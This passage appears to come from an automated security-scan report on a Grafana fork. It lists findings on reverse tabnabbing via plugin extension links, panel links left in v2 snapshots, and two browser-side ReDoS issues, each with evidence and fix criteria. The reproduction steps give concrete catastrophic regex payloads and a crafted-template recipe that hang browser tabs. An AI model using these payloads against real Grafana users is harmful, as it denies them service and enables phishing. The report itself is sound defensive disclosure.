   Registration validates only that a title exists, configure is a function, and path || onClick is present; nothing restricts path to a relative/same-origin URL or to the plugin's own /a/<pluginId>/ routes (no isLinkPathValid-style check exists anywhere under plugins/extensions).
4. [public/app/features/plugins/extensions/utils.tsx:569–593](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/utils.tsx#L569-L593)
   addedLinkToExtensionLink forwards the plugin's path (or a configure() override from getLinkExtensionOverrides) verbatim, only appending uel_pid/uel_epid tracking query params; the origin is untouched. locationUtil.assureBaseUrl (recovered from public/build/6540.*.js.map, grafana-data utils/location.ts:61-66) prefixes appSubUrl only when the string starts with '/', returning absolute http(s) URLs unchanged and passing protocol-relative '//host/..' through stripBaseFromUrl unmodified.
5. [public/app/features/explore/extensions/DrilldownExtensionPoint.tsx:44–50](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/extensions/DrilldownExtensionPoint.tsx#L44-L50)
   Same global.open(assureBaseUrl(path), '_blank') pattern without noopener; filtered to the QUERYLESS_APPS plugin ids (Grafana-owned drilldown apps using /a/ paths), so same-origin in practice, but shares the defect.
6. [public/app/features/alerting/unified/components/extensions/ConfirmationNavigationModal.tsx:16–19](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/extensions/ConfirmationNavigationModal.tsx#L16-L19)
   Verbatim copy of the Explore modal used by AlertingRuleQueryExtensionPoint for alert-rule query extension links: identical global.open(assureBaseUrl(path), '_blank') without noopener. Listed so the fix covers every instance; TracePageHeader.tsx:241 (window.open(link.path, '_blank') for trace extension links) is a third.

## Impact
The authenticated Grafana tab can be navigated to an attacker-chosen URL via the cross-origin opener.location setter, enabling credential phishing against the user. Cross-origin opener access permits navigation only — no read of Grafana DOM, cookies or data — so integrity of the user's browsing context is affected at a low level; confidentiality and availability of Grafana itself are not directly impacted.

## Reproduction steps
1. Attacker controls (or compromises, or is reached by redirect from) the external site that an installed app plugin's Explore toolbar extension link points to; no Grafana privileges are needed. A victim with datasources:explore clicks the plugin link in the toolbar menu and then "Open in new tab" in ConfirmNavigationModal. The opened page reads window.opener (live because window.open lacked noopener and no COOP is configured) and sets opener.location to a phishing clone of Grafana. Requires a deployment where some installed plugin registers an off-origin ExploreToolbarAction link (AT:PRESENT) and two explicit clicks (UI:ACTIVE).

## Recommended fix
1. Host code opens extension-supplied paths in a new tab with window.open(url, '_blank') and no 'noopener' feature (ConfirmNavigationModal.tsx:17, alerting ConfirmationNavigationModal.tsx:17, DrilldownExtensionPoint.tsx:50, TracePageHeader.tsx:241), so the opened document keeps a reference to the authenticated Grafana window. Fix criteria: Every new-tab navigation to a plugin-extension path must be opened with the opener severed (window features including 'noopener,noreferrer', or an anchor with rel=noopener), matching the project's existing convention. Verify by opening an off-origin extension link in a new tab and confirming window.opener is null in the opened document.
2. Plugin extension link `path` is accepted at registration (AddedLinksRegistry) and at render time (addedLinkToExtensionLink / configure() overrides) without any restriction on scheme or origin, and locationUtil.assureBaseUrl passes absolute and protocol-relative URLs through unchanged. Fix criteria: Extension link paths consumed by core navigation code must be validated as same-origin relative paths (historically /a/<pluginId>/...), or off-origin and non-http(s) paths must be rejected or rendered as explicit external links with the opener severed before window.open or locationService.push is invoked. Verify that a plugin registering path 'https://example.org', '//example.org/x' or 'javascript:1' is not opened by the Explore toolbar.

---
**Severity:** LOW
**Status:** Open
**Category:** Reverse tabnabbing
**CWE:** [CWE-1022](https://cwe.mitre.org/data/definitions/1022.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256213

---

# V2 snapshot trim checks 'links' on element wrapper, leaving panel links in published snapshots

## Details
The scenes snapshot flow (ShareSnapshotTab.prepareSnapshot) promises, in the drawer text, that a snapshot removes "sensitive data such as queries and panel links". For v2-schema dashboards (the default with dashboardNewLayouts enabled) it serializes the scene with transformSceneToSaveModelSchemaV2(scene, true) and then calls the v2 trimDashboardForSnapshot().

The v2 trim attempts to clear panel links with:

  Object.entries(spec.elements).map(([key, element]) => { if ('links' in element) { element.links = []; } return [key, element]; })

but each element is a {kind: 'Panel'|'LibraryPanel', spec: {...}} wrapper; the links array is at element.spec.links (written unconditionally by vizPanelToSchemaV2 via getPanelLinks, which returns the authored rawLinks). The 'links' in element test is therefore always false and no panel link is removed. The v1 counterpart (transformSceneToSaveModel.ts trimDashboardForSnapshot) operates on flat Panel objects where 'links' in panel is correct, which is presumably where this code was copied from. There is no test asserting links are absent from a v2 snapshot.

The snapshot (with all panel links intact: raw URLs with variable templates, internal hostnames, pre-signed or token-bearing URLs editors commonly place in panel links) is then POSTed to /api/snapshots and, if the user chooses the external option (external_enabled defaults to true), forwarded to https://snapshots.raintank.io. Snapshots are readable by anyone with the key, including anonymous users. Viewers of the snapshot also see and can click the links from the panel header menu.

Impact: disclosure of authored panel-link URLs to unauthenticated snapshot viewers and to a third-party server, contrary to the product's explicit promise; also a phishing/navigation vector since snapshot viewers get live links the author believed were stripped. Attacker is any snapshot recipient; the author only needs to publish a snapshot normally.

## Evidence
1. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts:778–785](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts#L778-L785)
   trimDashboardForSnapshot (v2) maps spec.elements and clears links only when 'links' in element. Each element is a {kind:'Panel'|'LibraryPanel', spec} wrapper; the links array is at element.spec.links, so the predicate is always false and no panel link is removed. The same check ships in public/build/6540.*.js ("links"in se&&(se.links=[])).
2. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts:355–363](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts#L355-L363)
   vizPanelToSchemaV2 builds the Panel element as {kind:'Panel', spec:{..., links: getPanelLinks(vizPanel), ...}} unconditionally, including when isSnapshot is true — establishing that links live at element.spec.links, not element.links.
3. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts:434–440](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts#L434-L440)
   getPanelLinks returns VizPanelLinks.state.rawLinks — the authored, uninterpolated panel link URLs.
4. [public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx:145–168](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx#L145-L168)
   prepareSnapshot takes the v2 branch when the scene serializer's apiVersion starts with 'dashboard.grafana.app/v2' (set from the k8s DTO in DashboardScene.setInitialSaveModel; the v2 scene is constructed with serializer 'v2' in transformSaveModelSchemaV2ToScene.ts:281, and the v2 manager is active whenever dashboardNewLayouts is on). It calls transformSceneToSaveModelSchemaV2(scene, true) then the broken v2 trim, and onSnapshotCreate POSTs the result to /api/snapshots with external=true|false.
5. [public/app/features/dashboard-scene/serialization/layoutSerializers/utils.ts:60–63](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/layoutSerializers/utils.ts#L60-L63)
   When the snapshot is opened, buildVizPanelState rebuilds VizPanelLinks from panel.spec.links, so snapshot viewers see and can click the retained links from the panel header.
6. [docs/sources/visualizations/dashboards/share-dashboards-panels/\_index.md:120](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/docs/sources/visualizations/dashboards/share-dashboards-panels/_index.md#L120)
   Product documentation: 'A dashboard snapshot publicly shares a dashboard while removing sensitive data such as queries and panel links ... Anyone with the link can access the snapshot.' This is the control the v2 path fails to deliver (the v1 trim in transformSceneToSaveModel.ts:1027-1031 does strip panel.links).
7. [public/app/features/dashboard-scene/sharing/ShareButton/share-snapshot/UpsertSnapshot.tsx:38–52](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareButton/share-snapshot/UpsertSnapshot.tsx#L38-L52)
   The share drawer repeats the promise to the publishing user that panel links are removed.
8. [docs/sources/setup-grafana/configure-grafana/feature-toggles/index.md:37](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/docs/sources/setup-grafana/configure-grafana/feature-toggles/index.md#L37)
   dashboardNewLayouts is GA and enabled by default; shouldForceV2API() in DashboardScenePageStateManager.ts:1373 is exactly this toggle, making the v2 serializer and this trim the default snapshot path.
9. [conf/defaults.ini:587–588](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/conf/defaults.ini#L587-L588)
   external_enabled = true and external_snapshot_url = https://snapshots.raintank.io by default, so the un-scrubbed payload may also be forwarded to a third-party host when the user picks the external option.

## Impact
Authored panel-link URLs (which may embed internal hostnames, template-variable paths or tokens) are disclosed to unauthenticated snapshot recipients and, optionally, a third-party host, contrary to the documented scrub that the v1 serializer still performs. Recipients also receive live, clickable links the author believed removed. No integrity or availability impact on Grafana itself; confidentiality impact is bounded to link URLs.

## Reproduction steps
1. Default v13 configuration: dashboardNewLayouts GA/on (so dashboards load through the v2 manager and get the v2 serializer), snapshots enabled, external snapshots enabled. A user with snapshot permission publishes a snapshot of a dashboard whose panels carry links, relying on the UI/docs statement that panel links are stripped. The v2 trim's 'links' in element check never matches the {kind,spec} wrapper, so every authored panel link URL is written to the snapshot payload. Any holder of the snapshot key reads it via GET /api/snapshots/<key> (no authentication beyond the key) or sees the links rendered in the snapshot's panel headers; with the external option the payload also goes to snapshots.raintank.io. No defence to defeat; the only interaction is the publisher's routine action.

## Recommended fix
trimDashboardForSnapshot (v2) tests for 'links' on the element wrapper instead of element.spec, so the intended scrub never executes and the serializer's unconditional links: getPanelLinks(...) survives into the snapshot. Fix criteria: A v2 snapshot payload must contain no panel links for any Panel element (spec.links empty or absent), matching the v1 behaviour and the UI promise. Verify by snapshotting a v2 dashboard whose panel has a distinctive link URL and asserting that URL is absent from the body sent to /api/snapshots; add a unit test on trimDashboardForSnapshot (v2) for this.

---
**Severity:** LOW
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-212](https://cwe.mitre.org/data/definitions/212.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256212

---

# Query-supplied Loki line-filter regex compiled and executed in browser enables ReDoS of log viewers

## Details
The logs renderer highlights search terms by compiling strings from the datasource response meta (`series.meta.searchWords` / `meta.custom.searchWords`, read without validation in logsModel.ts:413 and attached to every LogRowModel) into JavaScript `RegExp` objects (grammar.ts `generateTextMatchGrammar`, line 65: `new RegExp(`(?:${cleaned})`, flags)`) and running them, via `Prism.tokenize` (processing.ts `highlightedBodyTokens` / `highlightedLogAttributesTokens`) or `findHighlightChunksInText` -> `findMatchesInText` (@grafana/data text.ts, recovered from public/build/6540.*.js.map: same `new RegExp(`(?:${cleaned})`, flags)` with `g` default, applied via `haystack.replace`), over every rendered log line on the browser main thread. The only guard is `cleanNeedle` (strips a trailing unclosed `(`/`[`/`{` group) plus a try/catch for syntax errors; nothing bounds backtracking complexity.

For Loki, the bundled plugin's `processStreamFrame` (backendResultTransformer.ts:50, recovered from data/plugins-bundled/loki/module.js.map) sets `meta.searchWords = getHighlighterExpressionsFromQuery(query.expr)`; `getHighlighterExpressionsFromQuery` (queryUtils.ts) pushes every `|~` line-filter term verbatim (only `|=` terms are `escapeRegExp`'d). Loki evaluates LogQL regexes with Go's RE2-syntax engine (linear time), so a pattern such as `(.+)+\x00|.*` or `(\w+\s?)*$` is accepted by Loki and matches every line, while the same pattern run by the browser's backtracking engine is exponential in line length (or in the length of any alphanumeric run such as a 32-hex trace ID). One rendered line is enough to block the tab for minutes or indefinitely; the regex is re-run for each visible row, after every search/collapse change (processing.ts clears the token cache), for displayed fields and OTel attributes (LogLine.tsx `DisplayedFields`), and for up to 200 rows in the log-context modal (LogLineContext.tsx:194-198 copies the row's searchWords onto context rows).

Attack paths:
1. A dashboard Editor saves a Logs panel (LogsPanel.tsx renders `LogList` unconditionally) whose Loki query contains a malicious `|~` filter. Every Viewer/Admin who opens the dashboard has their tab hang as the panel renders (Editor -> Viewer boundary, in scope per the threat model).
2. An unauthenticated attacker crafts `/explore?panes=...` containing a Loki query with the filter; `useStateSync` -> `initializeExplore` dispatches `runQueries` on load (explorePane.ts:217) and Explore's Logs.tsx renders the same `LogList`. The query runs with the victim's permissions; Explore is granted to Editor and above by default (`fixed:datasources:explorer`), so the victim is a logged-in Editor/Admin who opens the link.

The in-scope root cause is that grammar.ts (and the sibling findMatchesInText) trusts datasource-supplied strings as regex syntax and executes them synchronously with a backtracking engine; the Loki plugin forwarding `|~` patterns raw is the delivery mechanism.

Dependency assumptions: prismjs as bundled in public/build/7606.*.js (source map shows `matchPattern` sets `pattern.lastIndex = pos` and calls `pattern.exec(text)` — confirmed, no linear-time fallback); @grafana/data `parseFlags` defaults to `g` and `findMatchesInText` compiles the needle (confirmed from the shipped bundle's source map); browser RegExp engines (V8 Irregexp, SpiderMonkey, JavaScriptCore Yarr) are backtracking engines with no linear-time fallback enabled by default, which is standard behaviour but not verifiable from this checkout.

## Evidence
1. [public/app/features/logs/components/panel/grammar.ts:55–86](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/grammar.ts#L55-L86)
   generateTextMatchGrammar() takes highlightWords (row.searchWords, which originate in the datasource response meta) and compiles each one verbatim with new RegExp(`(?:${cleaned})`, flags). The only protection is a try/catch for syntax errors; nothing bounds the pattern's backtracking complexity, and the resulting RegExp array becomes the 'log-search-match' Prism token that is run over every rendered log line.
2. [public/app/features/logs/components/panel/processing.ts:198–220](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/processing.ts#L198-L220)
   LogListModel.highlightedBodyTokens and highlightedLogAttributesTokens merge the searchWords grammar into the Prism grammar and call Prism.tokenize(body, ...) synchronously on the full line body during render; the regex runs for every visible row and again whenever the search or collapsed state changes (lines 275-292 clear the cache).
3. [public/app/features/logs/logsModel.ts:411–414](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/logsModel.ts#L411-L414)
   searchWords is read straight from the DataFrame meta (series.meta.custom.searchWords ?? series.meta.searchWords) and attached to every LogRowModel (line 447) with no validation; the frame meta is produced by the datasource plugin from the query text.
4. [public/app/features/logs/components/panel/LogLine.tsx:454–499](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/LogLine.tsx#L454-L499)
   LogLineBody renders highlightedBodyTokens when syntax highlighting is on (the default), and otherwise passes the same searchWords to react-highlight-words' Highlighter with findHighlightChunksInText (which, per the shipped @grafana/data bundle, compiles the same needle with the 'g' flag). Either path executes the attacker's regex against the line text on the main thread. DisplayedFields (lines 404-447) does the same for displayed field values.
5. [public/app/features/logs/components/panel/LogLineContext.tsx:194–197](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/LogLineContext.tsx#L194-L197)
   The log-context modal copies the original row's searchWords onto every context row, so the hostile regex is also executed against the up-to-200 context lines loaded around the row.
6. [data/plugins-bundled/loki/module.js](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/loki/module.js) (whole file)
   The bundled Loki datasource sets meta.searchWords = getHighlighterExpressionsFromQuery(query.expr). Per its source map (webpack://loki/./queryUtils.ts), a `|~ "..."` or |~ `...` line-filter term is pushed to the array as a raw regular expression (only `|=` terms are escapeRegExp'd), so the LogQL author fully controls the pattern that the frontend compiles.
7. [public/app/features/logs/components/panel/grammar.test.ts:150–158](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/grammar.test.ts#L150-L158)
   Tests show the maintainers intentionally treat searchWords as regular expressions (e.g. '(?i)(TRACE|DEBUG|...)' becomes /(?:(TRACE|...))/gi) and only guard against unparsable patterns, not against catastrophic backtracking.

## Impact
The Grafana frontend in the victim's browser blocks on the main thread while the regex backtracks; the dashboard or Explore view is unusable and re-triggers on every render, search change, or reload of the same dashboard. No data is disclosed or modified. Availability loss is confined to the victim's tab/session rather than the server, hence LOW.

## Reproduction steps
1. Attacker writes a LogQL expression with a catastrophic `|~` regex that RE2 accepts and that matches every line (e.g. `(.+)+\x00|.*`). Delivered either in a saved dashboard (Editor privileges, reaching Viewers) or as an Explore link a logged-in Editor/Admin opens (no privileges for the attacker, UI:P). The Loki plugin copies the pattern into frame meta on the client; logsModel attaches it to every row; LogLine/processing compile and execute it per rendered row via Prism.tokenize or findMatchesInText. Requires a Loki datasource the victim can query and at least one returned line (any content suffices for the alternation pattern), so AT:PRESENT. No security mechanism has to be defeated; the try/catch guards only syntax errors.

## Recommended fix
1. grammar.ts generateTextMatchGrammar() (and the sibling findHighlightChunksInText path) treat datasource-supplied searchWords as trusted regular-expression syntax and execute them synchronously against untrusted log text with a backtracking engine. Fix criteria: Search-term highlighting must not be able to consume super-linear time on any input: either match searchWords literally (escapeRegex) or restrict accepted patterns to a bounded-complexity subset / run them with a time budget off the main thread. Verify by rendering a Loki result whose meta.searchWords contains `(\w+\s?)*$` against a line with a 40-character alphanumeric token and confirming the panel renders promptly.
2. The Loki datasource plugin forwards raw `|~` regex filters from the query into meta.searchWords, letting the query author (dashboard editor or URL crafter) choose the pattern the browser compiles. Fix criteria: The datasource should not emit user-authored regex syntax as highlight terms (emit only literal `|=` terms, or pre-validate/escape `|~` terms). After the fix, a `|~` filter in the query must not result in an unescaped regex reaching generateTextMatchGrammar.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256211

---

# Quadratic regex scan of Alertmanager template files hangs contact-point template picker

## Details
The notification-template parser used by the contact-point form's template picker (`parseTemplates`, fields/utils.ts:23) matches `/{{-?\s*(define|end|if|range|else|with|template|block)\b(.*?)-?}}/gs` against the full text of every template file. Because of the `s` flag the lazy `(.*?)` group may extend across the whole remaining document, and for every `{{ <keyword>` opener that is never followed by `}}` the engine extends the lazy group one character at a time to the end of the string before failing at that start position. A template file consisting of N repetitions of `{{if ` with no `}}` anywhere costs O(N x L) character steps - roughly 4x10^9 for a 200 KB file and 10^11 for 1 MB - which blocks the browser's main thread for seconds to minutes. No length limit is applied before parsing. (Assumption: V8/irregexp backtracking semantics with no required-trailing-literal pre-check and the non-backtracking fallback engine off, which is the default in shipped Chromium/Firefox.)

Reachability. `TemplateSelector` (opened via the "Edit <field>" button that `WrapWithTemplateSelection` renders for every editable option whose placeholder contains `{{ template `) calls `getTemplateOptions(filteredData, defaultTemplates)` inside a `useMemo`, which runs `parseTemplates` on each template returned by `useNotificationTemplates({alertmanager: selectedAlertmanager})`. For a Mimir/Cortex-type external Alertmanager the templates are `Object.entries(config.template_files)` from `GET /api/alertmanager/<dsUid>/config/api/v1/alerts` (useNotificationTemplates.ts:100-111, `amConfigToTemplates`), passed through with `kind: 'grafana'` so they survive the picker's `filterKind="grafana"` filter - i.e. the content is whatever the datasource returns. The cloud notifier definitions for jira, email, pagerduty, pushover, slack, opsgenie, victorops, discord, webex, sns and wechat carry `{{ template "..." . }}` placeholders, and `CloudReceiverForm` sets `isEditable` for every non-vanilla (Mimir) Alertmanager, so the picker is available in `CloudReceiverForm` for any Mimir-type datasource. A compromised or malicious external Alertmanager, or an attacker on the network path to it (threat-model adversary 4), can therefore return a single pathological `template_files` entry that deterministically hangs the tab of every Grafana user who opens a contact point for that Alertmanager and clicks "Edit message/summary/...".

Note on the write path: the quadratic input necessarily contains `{{` openers with no following `}}`, which is not a parseable Go template; Grafana's own template save path and Mimir's config POST are understood to parse templates before accepting them (backend not in this checkout), so an Editor storing such a template through a sanctioned write API is not claimed here - the attacker position is the datasource response itself.

The same quadratic lazy-match shape exists in `editor/autocomplete.ts:53` (`isInsideGoExpression` runs `\{\{(?:.|\n)+?\}\}` via Monaco `findMatches` over the full model on every completion request), so opening such a template from the same external Alertmanager in `EditMessageTemplate`/`TemplateForm` and typing `.` also stalls the browser. The template-table expand view and the Monaco Monarch tokenizer are line-based and not affected.

This is a client-side algorithmic-complexity DoS only: no data is disclosed or modified, the server is unaffected, and the user recovers by closing the tab. It is filed because the trigger is datasource-returned data (the threat model's stated exception to the browser-DoS exclusion) and because the cost is set by the attacker's input shape, not by volume.

## Evidence
1. [public/app/features/alerting/unified/components/receivers/form/fields/utils.ts:20–29](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/receivers/form/fields/utils.ts#L20-L29)
   parseTemplates runs /{{-?\s*(define|end|if|range|else|with|template|block)\b(.*?)-?}}/gs over the entire template-file string. With the s flag the lazy (.*?) extends across newlines until '-?}}' is found; for every '{{<keyword>' that has no '}}' after it the engine extends to the end of the string before failing at that start position, so total work is O(#openers x length) - quadratic in content size. No length cap is applied.
2. [public/app/features/alerting/unified/components/receivers/form/fields/TemplateSelector.tsx:92–118](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/receivers/form/fields/TemplateSelector.tsx#L92-L118)
   getTemplateOptions calls parseTemplates(content) for every template file returned by useNotificationTemplates; TemplateSelector (lines 190-195) invokes it in a useMemo as soon as templates and default templates have loaded, i.e. when the picker drawer opens, blocking the render.
3. [public/app/features/alerting/unified/components/contact-points/useNotificationTemplates.ts:100–111](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/contact-points/useNotificationTemplates.ts#L100-L111)
   For a non-Grafana (Mimir / external) Alertmanager the template list is amConfigToTemplates(config): every entry of config.template_files fetched from the external Alertmanager datasource (GET /api/alertmanager/<ds>/config/api/v1/alerts) is passed through unmodified with kind 'grafana', so the content is datasource-controlled data that survives the picker's kind filter.
4. [public/app/features/alerting/unified/components/receivers/form/fields/TemplateSelector.tsx:349–402](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/receivers/form/fields/TemplateSelector.tsx#L349-L402)
   WrapWithTemplateSelection shows the TemplatesPicker whenever the option placeholder contains '{{ template ' and the form is editable (OptionField.tsx:175 sets useTemplates from the placeholder; CloudReceiverForm.tsx sets isEditable for every non-vanilla Alertmanager); cloud notifier options for jira, email, pagerduty, pushover, slack and others (utils/cloud-alertmanager-notifier-types.ts) carry such placeholders, so the picker is reachable in CloudReceiverForm for Mimir-type Alertmanagers.
5. [public/app/features/alerting/unified/components/receivers/editor/autocomplete.ts:51–61](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/receivers/editor/autocomplete.ts#L51-L61)
   Same weakness at a second sink: isInsideGoExpression runs model.findMatches('\\{\\{(?:.|\\n)+?\\}\\}') over the whole editor model on every completion request (trigger character '.'), which is quadratic for the same class of content when a crafted template from the same external Alertmanager is opened in TemplateForm/EditMessageTemplate and the victim types in it.

## Impact
Impact is limited to the victim's browser tab becoming unresponsive for the duration of the regex scan (seconds to minutes for a 200 KB-1 MB template); no confidentiality or integrity impact, server unaffected, recovered by closing the tab.

## Reproduction steps
1. Attacker: a compromised or malicious external Mimir/Cortex Alertmanager datasource (or a man-in-the-middle on Grafana's path to it) - threat-model adversary 4, needing no privileges on Grafana (PR:N). Precondition: such an external Alertmanager datasource must be configured in Grafana (AT:P). Delivery: return one `template_files` entry of ~0.2-1 MB consisting of repeated `{{if ` openers with no `}}` in the GET config response. Trigger: a victim with contact-point access selects that Alertmanager, opens a contact point whose integration has a templated field and clicks "Edit <field>" (UI:A); parseTemplates then runs O(N x L) work on the main thread. No bypass or timing needed (AC:L).

## Recommended fix
1. parseTemplates uses a lazy dot-all `(.*?)-?}}` group that can extend over the whole remaining document for every unclosed `{{ <keyword>` opener, giving quadratic worst-case cost on untrusted template content with no size bound. Fix criteria: Parsing a template file must complete in time linear in its length regardless of content (e.g. a single-pass tokenizer that finds the next `}}` once and advances past it, or a regex whose action body cannot span a later `{{`), and/or content longer than a fixed bound must be rejected before parsing. Verify by timing parseTemplates on a 1 MB string of repeated `{{if ` - it must finish in well under a second.
2. isInsideGoExpression in editor/autocomplete.ts rescans the whole editor model with a lazy `\{\{(?:.|\n)+?\}\}` regex on every completion request, with the same quadratic worst case. Fix criteria: Determining whether the cursor is inside a `{{ ... }}` expression must inspect only the text around the cursor (e.g. search backwards for the nearest `{{`/`}}` from the cursor position) rather than matching every expression in the document; the check must be linear in document size and ideally independent of it.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256207